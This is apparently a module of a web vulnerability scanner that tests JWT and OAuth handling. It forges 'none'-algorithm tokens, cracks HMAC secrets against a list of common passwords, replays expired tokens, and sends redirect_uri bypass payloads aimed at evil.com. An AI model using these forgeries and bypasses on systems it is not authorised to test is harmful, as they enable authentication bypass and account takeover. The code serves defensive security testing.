"""Module 4 — JWT and OAuth Security Tester.

Tests for JWT algorithm confusion, none-algorithm acceptance, weak HMAC
secrets, expiry enforcement, and OAuth flow weaknesses (missing state,
redirect_uri bypass).
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import re
import time
from typing import Any

from phantomscan.http_client import RobustHTTPClient

logger = logging.getLogger(__name__)

_WEAK_SECRETS = [
    "secret", "password", "123456", "key", "jwt_secret",
    "supersecret", "mysecret", "secret123", "changeme",
    "your-256-bit-secret", "your-secret-key", "", "null",
    "undefined", "test", "qwerty", "letmein", "welcome",
    "default", "admin", "token", "jwt", "signing_key",
]


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


class JWTOAuthTester:
    """Test JWT tokens and OAuth flows for known weaknesses."""

    def __init__(self, http: RobustHTTPClient) -> None:
        self.http = http

    async def run(
        self,
        base_url: str,
        observations: list[dict[str, Any]],
        **kwargs: Any,
    ) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []
        target = base_url.rstrip("/")

        # Extract JWT tokens from observations (cookies, headers, bodies)
        tokens = self._extract_jwts(observations)
        auth_tok = kwargs.get("auth_token")
        if auth_tok and isinstance(auth_tok, str) and auth_tok not in tokens:
            tokens.append(auth_tok)
        endpoints = self._guess_jwt_endpoints(target, observations)

        import asyncio

        tasks = [
            self._test_jwt(token, endpoint)
            for token in tokens[:5]
            for endpoint in endpoints[:3]
        ]
        tasks.append(self._test_oauth(target))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, list):
                findings.extend(r)

        return findings

    # ── JWT Tests ─────────────────────────────────────────────────────────────

    async def _test_jwt(
        self, token: str, endpoint: str
    ) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []

        try:
            header, payload, signature = self._decode_jwt(token)
        except Exception:
            return findings

        # Test 1: None algorithm
        none_findings = await self._test_none_alg(payload, endpoint)
        findings.extend(none_findings)

        # Test 2: Weak secret brute-force
        weak_findings = self._test_weak_secret(token, header)
        findings.extend(weak_findings)

        # Test 3: Expired token acceptance
        expiry_findings = await self._test_expiry(payload, header, endpoint)
        findings.extend(expiry_findings)

        return findings

    async def _test_none_alg(
        self, payload: dict[str, Any], endpoint: str
    ) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []
        for alg in ("none", "None", "NONE", "nOnE"):
            forged = self._forge_jwt({"alg": alg, "typ": "JWT"}, payload, "")
            try:
                response = await self.http.get(
                    endpoint,
                    headers={"Authorization": f"Bearer {forged}"},
                    retries=1,
                )
                if response.status == 200:
                    findings.append({
                        "id": "JWT-NONE-ALG",
                        "title": "JWT None Algorithm Accepted",
                        "severity": "critical",
                        "confidence": "high",
                        "category": "jwt",
                        "target": endpoint,
                        "evidence": (
                            f"Forged JWT with alg:{alg} accepted by "
                            f"{endpoint} (HTTP 200). Signature verification "
                            f"is completely bypassed."
                        ),
                        "recommendation": (
                            "Reject JWTs with 'none' algorithm. Use a strict "
                            "allow-list of signing algorithms (e.g. RS256 only). "
                            "CWE-347."
                        ),
                        "references": ["https://cwe.mitre.org/data/definitions/347.html"],
                    })
                    return findings  # one is enough
            except Exception:
                continue
        return findings

    def _test_weak_secret(
        self, token: str, header: dict[str, Any]
    ) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []
        alg = header.get("alg", "")
        if alg not in ("HS256", "HS384", "HS512"):
            return findings

        parts = token.split(".")
        if len(parts) != 3:
            return findings

        signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
        target_sig = _b64url_decode(parts[2])

        hash_funcs = {"HS256": "sha256", "HS384": "sha384", "HS512": "sha512"}
        hash_name = hash_funcs.get(alg, "sha256")

        for secret in _WEAK_SECRETS:
            computed = hmac.new(
                secret.encode("utf-8"), signing_input, hash_name
            ).digest()
            if hmac.compare_digest(computed, target_sig):
                findings.append({
                    "id": "JWT-WEAK-SECRET",
                    "title": "JWT Signed with Weak/Common Secret",
                    "severity": "critical",
                    "confidence": "high",
                    "category": "jwt",
                    "target": "",
                    "evidence": (
                        f"JWT HMAC secret cracked: '{secret}' "
                        f"(algorithm: {alg}). Any party knowing this "
                        f"secret can forge valid tokens."
                    ),
                    "recommendation": (
                        "Use a cryptographically strong random secret "
                        "(≥256 bits). Consider switching to asymmetric "
                        "signing (RS256/ES256). CWE-521."
                    ),
                    "references": ["https://cwe.mitre.org/data/definitions/521.html"],
                })
                return findings
        return findings

    async def _test_expiry(
        self, payload: dict[str, Any], header: dict[str, Any], endpoint: str
    ) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []
        expired_payload = dict(payload)
        expired_payload["exp"] = 1577836800  # 2020-01-01

        alg = header.get("alg", "HS256")
        # We can only test expiry enforcement with none-alg or a known secret
        forged = self._forge_jwt(
            {"alg": "none", "typ": "JWT"}, expired_payload, ""
        )
        try:
            response = await self.http.get(
                endpoint,
                headers={"Authorization": f"Bearer {forged}"},
                retries=1,
            )
            if response.status == 200:
                findings.append({
                    "id": "JWT-EXPIRY-NOT-ENFORCED",
                    "title": "JWT Expiry Not Enforced",
                    "severity": "high",
                    "confidence": "medium",
                    "category": "jwt",
                    "target": endpoint,
                    "evidence": (
                        f"Token with exp=2020-01-01 accepted by {endpoint}. "
                        f"Sessions may never truly expire."
                    ),
                    "recommendation": (
                        "Validate the 'exp' claim on every request. Reject "
                        "tokens that have expired. CWE-613."
                    ),
                    "references": ["https://cwe.mitre.org/data/definitions/613.html"],
                })
        except Exception:
            pass
        return findings

    # ── OAuth Tests ───────────────────────────────────────────────────────────

    async def _test_oauth(self, target: str) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []
        oauth_paths = [
            "/oauth/authorize", "/auth/authorize", "/oauth2/authorize",
            "/connect/authorize", "/.well-known/openid-configuration",
        ]

        for path in oauth_paths:
            url = f"{target}{path}"
            try:
                response = await self.http.get(url, retries=1, allow_redirects=False)
                if response.status in (200, 302, 303, 307):
                    # Check for missing state parameter
                    location = response.headers.get("location", "")
                    body = response.text()
                    combined = f"{location} {body} {url}"

                    if "state=" not in combined and response.status in (302, 303, 307):
                        findings.append({
                            "id": "OAUTH-NO-STATE",
                            "title": "OAuth Missing State Parameter (CSRF)",
                            "severity": "high",
                            "confidence": "high",
                            "category": "oauth",
                            "target": url,
                            "evidence": (
                                f"OAuth redirect from {url} contains no "
                                f"'state' parameter. Location: {location[:200]}"
                            ),
                            "recommendation": (
                                "Include a cryptographically random 'state' "
                                "parameter in OAuth authorization requests and "
                                "validate it on callback. CWE-352."
                            ),
                            "references": ["https://cwe.mitre.org/data/definitions/352.html"],
                        })

                    # Test redirect_uri manipulation
                    redirect_findings = await self._test_redirect_uri(url)
                    findings.extend(redirect_findings)
            except Exception:
                continue
        return findings

    async def _test_redirect_uri(self, oauth_url: str) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []
        bypasses = [
            "redirect_uri=https://evil.com",
            "redirect_uri=https://evil.com%40legitimate.com",
            "redirect_uri=https://legitimate.com.evil.com",
            "redirect_uri=https://legitimate.com/callback?next=https://evil.com",
        ]
        for bypass in bypasses:
            test_url = f"{oauth_url}?{bypass}&response_type=code&client_id=test"
            try:
                response = await self.http.get(test_url, retries=1, allow_redirects=False)
                location = response.headers.get("location", "")
                if response.status in (302, 303, 307) and "evil.com" in location:
                    findings.append({
                        "id": "OAUTH-REDIRECT-BYPASS",
                        "title": "OAuth redirect_uri Validation Bypass",
                        "severity": "critical",
                        "confidence": "high",
                        "category": "oauth",
                        "target": oauth_url,
                        "evidence": (
                            f"Bypass payload: {bypass}\n"
                            f"Server redirected to: {location[:200]}"
                        ),
                        "recommendation": (
                            "Implement strict redirect_uri validation using "
                            "exact string matching against pre-registered URIs. "
                            "CWE-601."
                        ),
                        "references": ["https://cwe.mitre.org/data/definitions/601.html"],
                    })
                    return findings
            except Exception:
                continue
        return findings

    # ── JWT Utilities ─────────────────────────────────────────────────────────

    @staticmethod
    def _decode_jwt(token: str) -> tuple[dict, dict, str]:
        parts = token.split(".")
        if len(parts) != 3:
            raise ValueError("Not a valid JWT")
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]

    @staticmethod
    def _forge_jwt(
        header: dict[str, Any], payload: dict[str, Any], signature: str
    ) -> str:
        h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        return f"{h}.{p}.{signature}"

    @staticmethod
    def _extract_jwts(observations: list[dict[str, Any]]) -> list[str]:
        tokens: set[str] = set()
        jwt_re = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*")

        def scan_val(val: Any) -> None:
            if isinstance(val, str):
                for match in jwt_re.findall(val):
                    tokens.add(match)
            elif isinstance(val, dict):
                for v in val.values():
                    scan_val(v)
            elif isinstance(val, list):
                for item in val:
                    scan_val(item)

        for obs in observations:
            scan_val(obs.get("value"))

        return list(tokens)

    @staticmethod
    def _guess_jwt_endpoints(target: str, observations: list[dict[str, Any]] | None = None) -> list[str]:
        endpoints: list[str] = [
            f"{target}/api/me",
            f"{target}/api/user",
            f"{target}/api/profile",
            f"{target}/api/v1/user",
            f"{target}/rest/user/whoami",
            f"{target}/rest/basket/1",
            f"{target}/dashboard",
        ]

        if observations:
            for obs in observations:
                name = str(obs.get("name", ""))
                val = obs.get("value")
                if "discovered_api" in name and isinstance(val, list):
                    for ep in val:
                        url = ep.get("url") if isinstance(ep, dict) else (ep if isinstance(ep, str) else None)
                        if url and isinstance(url, str) and not url.startswith("#"):
                            full_url = url if url.startswith("http") else f"{target.rstrip('/')}{url}"
                            if any(k in full_url.lower() for k in ("user", "profile", "me", "account", "whoami", "basket", "order", "auth")):
                                if full_url not in endpoints:
                                    endpoints.append(full_url)

        return endpoints
